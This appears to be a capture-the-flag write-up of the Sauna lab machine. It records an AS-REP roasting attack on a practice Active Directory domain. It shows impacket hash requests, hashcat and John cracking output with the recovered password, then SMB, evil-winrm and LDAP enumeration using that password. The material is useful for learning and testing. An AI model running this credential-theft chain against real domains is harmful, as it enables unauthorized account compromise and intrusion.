

got lost checked and started using the guided mode, it told me to use anarchy
https://github.com/urbanadventurer/username-anarchy

Using hashcat!!


```
kali@kali ~/username-anarchy (master)> hashcat -m 18200 -a 0 ASREProastables.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-Intel(R) Core(TM) i5-7400 CPU @ 3.00GHz, 1783/3631 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 5 secs

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a3d03435bf1f7e7658f5665d6e97885c$92726f25aedaae419e1064d7ce3eeccf365e2d9d1ecbcd7dea758e3e68b229ad95693c18854a761c114b038f3fa9b7bde9fd8562ca51bc00754ec6241cced0a7891afb99eb0f0c4b1b517d7c837d85865771657f13e13d015eea2682a2e5940debb649f853704396913e7ae88053053b35f65665869b75915412e9deef4c9118735acfb8988a40e17a5fc22f89678740d4702900ed840e9a0ebc9edc89ffbd28560dd421f31195365aa86c18a2a6ccac8292a01f0155681d2275a74ac0aab89b0b6e82a0a007861be39f782d8a69e21d606225743f94c54ccccce574d6e8da020110cc3c2756cf93f5aad82f6c3a65c9063cec270a346b82795fa53681cca3a5:Thestrokes23
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:4bf571c6e611381426db01ec374ce9cb$3482765751d4c6e1c43f24c8ea9696d036f57b5624c97b9ebf8ec64cdb208c038e2fb4763cb15658bfbb2db0646af4223897ea355a9602383fc2ba9b7c9e809eeeb8def76ba2920503ff6b308c574e096b9a25a70983367c3969d7fe40593ea97f149417c5d5291d806ef8be2b4acd69c73d0fe252e63b6da88e6e86868a722c1b50b11cddf661776a070e1e3aa1f72994eca8e7e180598f2616481a3cb49ccfb01b5a0242729db8e623322b1dd10e068cbe28323427100da6f7dd1e285576799d46ed748ad1705847ca4736a1f968f2d3bea19c474fc2ddf6dab5169c1b4e14260c1a6a2737df4d01662686ed569d4f6af9ede8c9b05a480e94feede16408f5:Thestrokes23
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: ASREProastables.txt
Time.Started.....: Thu Feb 15 07:29:36 2024 (25 secs)
Time.Estimated...: Thu Feb 15 07:30:01 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   894.5 kH/s (0.70ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new), 2/2 (100.00%) Salts
Progress.........: 21078016/28688770 (73.47%)
Rejected.........: 0/21078016 (0.00%)
Restore.Point....: 10537984/14344385 (73.46%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Throy1 -> Thelittlemermaid
Hardware.Mon.#1..: Util: 57%

Started: Thu Feb 15 07:28:55 2024
Stopped: Thu Feb 15 07:30:02 2024

```



Using John the Ripper


Pre-requisite 
```
kali@kali ~/username-anarchy (master)> impacket-GetNPUsers -usersfile FLlist.txt -request -format john -outputfile ASREProastables2.txt -dc-ip 10.10.10.175 'EGOTISTICAL-BANK.LOCAL/'
Impacket v0.11.0 - Copyright 2023 Fortra

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$fsmith@EGOTISTICAL-BANK.LOCAL:6dbf7586b0337413face3416b7b34d96$a1dadac3e95fb61fb8b23a7c9478bf4d0bd9a9cff2d4837dd25615a4fd0a9fa13d7ba2a39ce4f6a03f9f56d4817d15f9f379687d014a683fd90cee20e00f703361c0a103e0bb87dc1b60c947b4a4e6e883ce4b38e546fa99148b9718fd6b45549b242097a89db816aed6b5977f1322fc1f8c1e05d487357d2f1942ab06a8cad8276c2d0602adab795a9ad4e941f9671b535caf0a6c769186419df667392899e867f94fb36d5c46fe825b7422e9b1c263051b2a418db0de08c279c796154decf8791006cfea4224b82c271bd558450610a59bdd9200a0af6c33669b695b9018ea677d07c29b3b12b9a4cbfd01491368e4e18cf93810701add2513bfa761b25fa7
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)

```


```
kali@kali ~/username-anarchy (master)> john --wordlist=/usr/share/john/rockyou.txt ASREProastables2.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$fsmith@EGOTISTICAL-BANK.LOCAL)     <--------------------------------------------- PASSWORD !!
2g 0:00:00:29 DONE (2024-02-15 07:33) 0.06682g/s 352121p/s 704243c/s 704243C/s Thing..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```



rechecking smb and most other protocols with the new credentials

```
kali@kali ~> nxc smb 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' --shares
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
SMB         10.10.10.175    445    SAUNA            [*] Enumerated shares
SMB         10.10.10.175    445    SAUNA            Share           Permissions     Remark
SMB         10.10.10.175    445    SAUNA            -----           -----------     ------
SMB         10.10.10.175    445    SAUNA            ADMIN$                          Remote Admin
SMB         10.10.10.175    445    SAUNA            C$                              Default share
SMB         10.10.10.175    445    SAUNA            IPC$            READ            Remote IPC
SMB         10.10.10.175    445    SAUNA            NETLOGON        READ            Logon server share 
SMB         10.10.10.175    445    SAUNA            print$          READ            Printer Drivers
SMB         10.10.10.175    445    SAUNA            RICOH Aficio SP 8300DN PCL 6                 We cant print money
SMB         10.10.10.175    445    SAUNA            SYSVOL          READ            Logon server share 

```



we also have winrm access

```
kali@kali ~> evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
Evil-WinRM shell v3.5
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents> 
```



I tried to use bloodyAD too to see the kerbroastable accounts

```
kali@kali ~/bloodyAD (main)> python bloodyAD.py --host 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' --domain EGOTISTICAL-BANK.LOCAL get search --filter '(&(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName | grep sAMAccountName | cut -d ' ' -f 2
HSmith
krbtgt
```





---

for initial enumeration i could have also used AD-Enum which would have made my life 10x easier

```
kali@kali ~/ADenum (master)> python ADenum.py -u 'fsmith' -p 'Thestrokes23' -d 'EGOTISTICAL-BANK.LOCAL'

   █████╗ ██████╗     ███████╗███╗   ██╗██╗   ██╗███╗   ███╗
  ██╔══██╗██╔══██╗    ██╔════╝████╗  ██║██║   ██║████╗ ████║
  ███████║██║  ██║    █████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
  ██╔══██║██║  ██║    ██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
  ██║  ██║██████╔╝    ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
  ╚═╝  ╚═╝╚═════╝     ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝


[*] Domain name:    EGOTISTICAL-BANK.LOCAL
[*] Username:       fsmith
[*] IP Address:     10.10.10.175
[!] SSL supported:  FALSE
[!] SSL connect:    FALSE

[+] Succesfully Authenticated With LDAP

[-] Authentication mechanism
[+] GSSAPI
[+] GSS-SPNEGO
[+] EXTERNAL
[!] DIGEST-MD5                         Consider as weak security protocols
[-] LOGIN                              Plaintext password
[-] PLAIN                              Plaintext password

====================================================
===================== Enum LDAP ====================
====================================================



[-] Users who are Domain Admin
[*] Username: Administrator            CN=Administrator,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL

[-] Domain Controllers
[*] Computer: SAUNA$                   CN=SAUNA,OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
    [V] Windows Server 2019 Datacenter 10.0 (17763)

[-] Users with Password Not Expire
[*] Username: Administrator            CN=Administrator,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
[*] Username: Guest                    CN=Guest,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
[*] Username: HSmith                   CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
[*] Username: FSmith                   CN=Fergus Smith,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
[*] Username: svc_loanmgr              CN=L Manager,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL

[-] Users with old password
[!] Username: Administrator            Password last change: 933 days ago 2021-07-26 16:16:16
[!] Username: krbtgt                   Password last change: 1484 days ago 2020-01-23 05:45:30
[!] Username: HSmith                   Password last change: 1484 days ago 2020-01-23 05:54:34
[!] Username: FSmith                   Password last change: 1483 days ago 2020-01-23 16:45:19
[!] Username: svc_loanmgr              Password last change: 1482 days ago 2020-01-24 23:48:31

[-] Users with an interesting description
[!] No entry found !

[-] Users with not the default encryption
[*] Username: krbtgt                   Password is in a reversible encryption or in DES !
[*] Username: FSmith                   Password is in a reversible encryption or in DES !

[-] Protecting Privileged Domain Accounts
[!] No entry found !

[-] Not Default Attributes (TEST IN BETA)

[!] CN=Fergus Smith,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL->    lockoutTime: 0

[-] Laps Password
[!] No entry found !


====================================================
==================== Attack AD =====================
====================================================


[-] AS-REP Roastable Users
[*] Username: FSmith                   CN=Fergus Smith,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
[+] Hash added to file:                ASREPHash.hash

[-] Kerberoastable Users
[*] Username: HSmith                   CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL

[-] Starting to crack hashs
[!] No entry found !
```


and still gives me the same password

```
kali@kali ~/ADenum (master)> cat ASREPHash.hash
$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:d468377be5e5a99d971a953ae38a0af5$7e7f143c010ad864a46d951ea59c7c7e8343b2b921512f95a333ba789458e7ad83a827df7af6a53c733a84547cd1e0e5d6ddd0df806c51be36b7d419f904c9df463fa9b0fbd2815314ec376fa2df8730da89c6c85608b33c06c1e284241d3b3873e489d34f08ac3053f29ecf86087e3125328c9ffbbc412b53f7d131b386941ca53b6b48d5c79a223a37234795aeec98d6a079da03782f03f7ad85ad68108c576a830e35427718cf7348a858b6bd0801358b9dadfb5f3db054954bd27cb0cddd3c55259089e733275e42a3dfef49b7c1eb42860d7c0bd0efdab92ccb6eb7b180009dc689bbd32bde00098e94d6f50c0db5802a78f29f3374bccebb44e1bdf145
kali@kali ~/ADenum (master)> john --wordlist=/usr/share/john/rockyou.txt ASREPHash.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL)     
1g 0:00:00:18 DONE (2024-02-15 10:05) 0.05417g/s 570910p/s 570910c/s 570910C/s Thing..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```